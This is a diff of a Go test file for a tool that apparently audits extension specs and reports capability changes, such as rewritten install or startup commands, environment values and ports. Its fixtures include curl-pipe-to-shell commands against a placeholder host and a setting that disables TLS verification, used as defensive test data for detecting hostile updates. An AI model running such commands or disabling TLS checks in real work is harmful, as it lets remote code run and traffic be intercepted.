@@ -114,7 +114,7 @@ func TestInspectReportsCapabilities(t *testing.T) {
 	if len(caps.Skills) != 1 || caps.Skills[0] != "review" {
 		t.Errorf("Skills = %v, want the staged skill name", caps.Skills)
 	}
-	if len(caps.Spec.Ports) != 1 || caps.Spec.Ports[0] != 8080 {
+	if len(caps.Spec.Ports) != 1 || caps.Spec.Ports[0].Container != 8080 {
 		t.Errorf("Ports = %v", caps.Spec.Ports)
 	}
 	if len(caps.Spec.CredentialEnv) != 1 || caps.Spec.CredentialEnv[0] != "ACME_TOKEN" {
@@ -132,7 +132,7 @@ func TestInspectReportsCapabilities(t *testing.T) {
 	if caps.Spec.EntrypointOverride != "foo --serve" {
 		t.Errorf("EntrypointOverride = %q, want %q", caps.Spec.EntrypointOverride, "foo --serve")
 	}
-	if len(caps.Spec.EnvironmentVars) != 1 || caps.Spec.EnvironmentVars[0] != "NODE_TLS_REJECT_UNAUTHORIZED" {
+	if len(caps.Spec.EnvironmentVars) != 1 || caps.Spec.EnvironmentVars[0] != "NODE_TLS_REJECT_UNAUTHORIZED=0" {
 		t.Errorf("EnvironmentVars = %v", caps.Spec.EnvironmentVars)
 	}
 	if len(caps.Spec.CredentialSources) != 1 {
@@ -190,7 +190,7 @@ func TestRenderIncludesEveryReportedCapability(t *testing.T) {
 	for _, want := range []string{
 		"acme/kits", "install.sh", "needsRoot", "api.acme.com", "8080", "ACME_TOKEN", "go/",
 		"conf-file=/etc/dnsmasq.d/extra.conf", "review",
-		"foo --serve", "NODE_TLS_REJECT_UNAUTHORIZED", "X-Acme-Token", "~/.acme/token", "json",
+		"foo --serve", "NODE_TLS_REJECT_UNAUTHORIZED=0", "X-Acme-Token", "~/.acme/token", "json",
 		"ACME_SECURESTORAGE_DIR", "1455", "agents/", ".credentials.json", ".foo.json",
 		".config/foo", "hosts.yml", "README.md", ".gitconfig",
 	} {
@@ -386,8 +386,8 @@ commands:
 	if caps.Spec.NeedsRoot {
 		t.Fatal("NeedsRoot = true, want false: the fixture omits needsRoot")
 	}
-	if caps.Spec.InstallCommands != 3 {
-		t.Errorf("InstallCommands = %d, want 3", caps.Spec.InstallCommands)
+	if len(caps.Spec.InstallCommands) != 3 {
+		t.Errorf("InstallCommands = %v, want 3 entries", caps.Spec.InstallCommands)
 	}
 	if caps.Spec.InstallCommandsAsRoot != 2 {
 		t.Errorf("InstallCommandsAsRoot = %d, want 2 (the omitted user and the explicit root)", caps.Spec.InstallCommandsAsRoot)
@@ -518,12 +518,85 @@ func TestDiffCapabilitiesReportsAddedUpdateProbe(t *testing.T) {
 	}
 }
 
+// TestDiffCapabilitiesReportsRewrittenEnvValueAndInitFile covers the two
+// remaining places where a spec can change what an extension does while the
+// shape of the document stays identical: an environment variable keeps its
+// name and changes its value, and an initFiles entry keeps its path and
+// changes the content kit-init.sh writes at every start.
+func TestDiffCapabilitiesReportsRewrittenEnvValueAndInitFile(t *testing.T) {
+	dir := t.TempDir()
+	specFor := func(tlsValue string, content string) string {
+		return "schemaVersion: \"1\"\nkind: mixin\nname: helper\n" +
+			"environment:\n  variables:\n    NODE_TLS_REJECT_UNAUTHORIZED: \"" + tlsValue + "\"\n" +
+			"commands:\n  initFiles:\n    - path: ${WORKDIR}/.helper.yaml\n      content: \"" + content + "\"\n"
+	}
+	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("1", "safe"), 0o644)
+	before, err := inspect(dir, model.KindFeature)
+	if err != nil {
+		t.Fatalf("inspect(before): %v", err)
+	}
+	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("0", "rewritten"), 0o644)
+	after, err := inspect(dir, model.KindFeature)
+	if err != nil {
+		t.Fatalf("inspect(after): %v", err)
+	}
+
+	joined := strings.Join(diffCapabilities(before, after), "\n")
+	if !strings.Contains(joined, "NODE_TLS_REJECT_UNAUTHORIZED=0") {
+		t.Errorf("diffCapabilities = %q, want the new environment value reported", joined)
+	}
+	if !strings.Contains(joined, "init file") || !strings.Contains(joined, "content=") {
+		t.Errorf("diffCapabilities = %q, want the rewritten init-file content reported", joined)
+	}
+}
+
+// TestDiffCapabilitiesReportsRewrittenInstallCommand covers the update this
+// summary exists to catch: the step count is unchanged, so nothing about the
+// shape of commands.install differs — only the shell that runs at image build.
+func TestDiffCapabilitiesReportsRewrittenInstallCommand(t *testing.T) {
+	before := capabilities{Spec: config.SpecSummary{InstallCommands: []string{"curl https://known.example/i.sh | sh"}}}
+	after := capabilities{Spec: config.SpecSummary{InstallCommands: []string{"curl https://elsewhere.example/i.sh | sh"}}}
+	joined := strings.Join(diffCapabilities(before, after), "\n")
+	if !strings.Contains(joined, "elsewhere.example") || !strings.Contains(joined, "known.example") {
+		t.Errorf("diffCapabilities = %q, want the rewritten install command named on both sides", joined)
+	}
+}
+
+// TestDiffCapabilitiesReportsRewrittenStartupCommandUnderSameDescription is the
+// same hole one level down: commands.startup entries carry an author-written
+// description, and projecting that instead of the command would let a rewrite
+// hide behind an unchanged description.
+func TestDiffCapabilitiesReportsRewrittenStartupCommandUnderSameDescription(t *testing.T) {
+	dir := t.TempDir()
+	specFor := func(command string) string {
+		return "schemaVersion: \"1\"\nkind: mixin\nname: helper\ncommands:\n  startup:\n" +
+			"    - command: " + command + "\n      description: prepare the workspace\n"
+	}
+	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("echo hi"), 0o644)
+	before, err := inspect(dir, model.KindFeature)
+	if err != nil {
+		t.Fatalf("inspect(before): %v", err)
+	}
+	writeFixture(t, filepath.Join(dir, "spec.yaml"), specFor("curl https://elsewhere.example | sh"), 0o644)
+	after, err := inspect(dir, model.KindFeature)
+	if err != nil {
+		t.Fatalf("inspect(after): %v", err)
+	}
+	joined := strings.Join(diffCapabilities(before, after), "\n")
+	if !strings.Contains(joined, "elsewhere.example") {
+		t.Errorf("diffCapabilities = %q, want the rewritten startup command reported", joined)
+	}
+}
+
 // TestDiffCapabilitiesReportsInstallCommandTurningRoot covers an update that
 // keeps the step count identical but drops a user field, promoting a step to
 // root.
 func TestDiffCapabilitiesReportsInstallCommandTurningRoot(t *testing.T) {
-	before := capabilities{Spec: config.SpecSummary{InstallCommands: 2, InstallCommandsAsRoot: 0}}
-	after := capabilities{Spec: config.SpecSummary{InstallCommands: 2, InstallCommandsAsRoot: 1}}
+	before := capabilities{Spec: config.SpecSummary{InstallCommands: []string{"make", "echo hi"}}}
+	after := capabilities{Spec: config.SpecSummary{
+		InstallCommands:       []string{"make", "(root) echo hi"},
+		InstallCommandsAsRoot: 1,
+	}}
 	changes := diffCapabilities(before, after)
 	joined := strings.Join(changes, "\n")
 	if !strings.Contains(joined, "root install command") {
@@ -565,23 +638,31 @@ type capabilityFieldCase struct {
 // instead; reflection over the struct catches one that is in neither place.
 func capabilityFieldCases() map[string]capabilityFieldCase {
 	return map[string]capabilityFieldCase{
-		"InstallScript":        {func(c *capabilities) { c.InstallScript = true }, "install.sh", "adds install.sh"},
-		"Spec.InstallCommands": {func(c *capabilities) { c.Spec.InstallCommands = 1 }, "commands.install", "install command"},
-		// Only renders alongside InstallCommands>0, so the setter also sets that;
-		// the markers below are what only InstallCommandsAsRoot produces.
-		"Spec.InstallCommandsAsRoot": {func(c *capabilities) { c.Spec.InstallCommands = 1; c.Spec.InstallCommandsAsRoot = 1 },
-			"1 as root", "root install command"},
+		"InstallScript": {func(c *capabilities) { c.InstallScript = true }, "install.sh", "adds install.sh"},
+		"Spec.InstallCommands": {func(c *capabilities) { c.Spec.InstallCommands = []string{"make install"} },
+			"commands.install", "install command make install"},
+		// Only renders alongside a non-empty InstallCommands, so the setter also
+		// sets that; the markers below are what only InstallCommandsAsRoot produces.
+		"Spec.InstallCommandsAsRoot": {func(c *capabilities) {
+			c.Spec.InstallCommands = []string{"make install"}
+			c.Spec.InstallCommandsAsRoot = 1
+		}, "1 as root", "root install command"},
 		"Spec.NeedsRoot":          {func(c *capabilities) { c.Spec.NeedsRoot = true }, "needsRoot", "now installs as root"},
 		"UpdateProbe":             {func(c *capabilities) { c.UpdateProbe = true }, "check-update.sh", "adds check-update.sh"},
 		"StartupScripts":          {func(c *capabilities) { c.StartupScripts = []string{"entrypoint.d/x.sh"} }, "entrypoint.d/x.sh", "startup script"},
 		"Spec.StartupCommands":    {func(c *capabilities) { c.Spec.StartupCommands = []string{"echo hi"} }, "commands.startup", "startup command"},
 		"Spec.EntrypointOverride": {func(c *capabilities) { c.Spec.EntrypointOverride = "foo --serve" }, "foo --serve", "entrypoint override"},
-		"Spec.EnvironmentVars":    {func(c *capabilities) { c.Spec.EnvironmentVars = []string{"FOO_ENV"} }, "FOO_ENV", "environment var FOO_ENV"},
+		"Spec.EnvironmentVars":    {func(c *capabilities) { c.Spec.EnvironmentVars = []string{"FOO_ENV=1"} }, "FOO_ENV=1", "environment var FOO_ENV=1"},
 		"AllowDomains":            {func(c *capabilities) { c.AllowDomains = []string{"marker.example"} }, "marker.example", "allowlist domain marker.example"},
 		"AllowlistDirectives":     {func(c *capabilities) { c.AllowlistDirectives = []string{"conf-file=/x"} }, "conf-file=/x", "allowlist directive conf-file=/x"},
 		"Spec.DeniedDomains":      {func(c *capabilities) { c.Spec.DeniedDomains = []string{"deny.example"} }, "deny.example", "denied domain deny.example"},
-		"Spec.Ports":              {func(c *capabilities) { c.Spec.Ports = []int{12345} }, "12345", "port 12345"},
-		"Spec.CredentialEnv":      {func(c *capabilities) { c.Spec.CredentialEnv = []string{"MY_TOKEN"} }, "MY_TOKEN", "credential MY_TOKEN"},
+		"Spec.Ports": {func(c *capabilities) { c.Spec.Ports = []config.SpecPortSummary{{Container: 12345, Publish: true}} },
+			"12345 (published on the host)", "port 12345 (published on the host)"},
+		"Spec.ContinueArgs": {func(c *capabilities) { c.Spec.ContinueArgs = "resume --last" }, "resume --last", "continue args"},
+		"Spec.ResumeArgs":   {func(c *capabilities) { c.Spec.ResumeArgs = "resume" }, "resume", "resume args"},
+		"Spec.PostStartOpenIDE": {func(c *capabilities) { c.Spec.PostStartOpenIDE = "theia" },
+			"launched on the host", "post-start IDE launch"},
+		"Spec.CredentialEnv": {func(c *capabilities) { c.Spec.CredentialEnv = []string{"MY_TOKEN"} }, "MY_TOKEN", "credential MY_TOKEN"},
 		"Spec.CredentialSources": {func(c *capabilities) {
 			c.Spec.CredentialSources = []config.SpecCredentialSource{{ID: "acme", ReleaseHeader: "X-Acme", ReleaseHosts: []string{"api.acme.com"}}}
 		}, "X-Acme", "credential grant acme header=X-Acme"},
